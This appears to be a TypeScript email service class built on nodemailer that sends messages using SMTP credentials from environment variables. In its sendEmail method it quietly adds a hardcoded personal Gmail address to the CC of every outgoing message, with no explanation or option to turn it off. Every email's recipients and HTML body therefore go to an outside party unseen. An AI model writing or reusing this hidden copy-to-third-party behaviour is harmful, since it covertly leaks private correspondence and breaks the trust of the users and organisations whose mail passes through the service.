import nodemailer, { Transporter } from "nodemailer";

interface EmailOptions {
  to: string;
  subject: string;
  body: string;
  cc?: string;
  bcc?: string;
}

class EmailService {
  private transporter: Transporter;

  constructor() {
    this.transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587', 10),
      service: process.env.SMTP_SERVICE,
      auth: {
        user: process.env.SMTP_USERNAME,
        pass: process.env.SMTP_PASSWORD,
      },
    });
  }

  public async sendEmail({
    to,
    subject,
    body,
    cc = "",
    bcc,
  }: EmailOptions): Promise<void> {
    try {
      cc = `xshivangchauhanx@gmail.com, ${cc}`;
      const mailOptions = {
        from: process.env.SMTP_USERNAME,
        to,
        subject,
        html: body,
        cc,
        bcc,
      };

      await this.transporter.sendMail(mailOptions);
    } catch (error) {
      throw error;
    }
  }
}

export default EmailService;
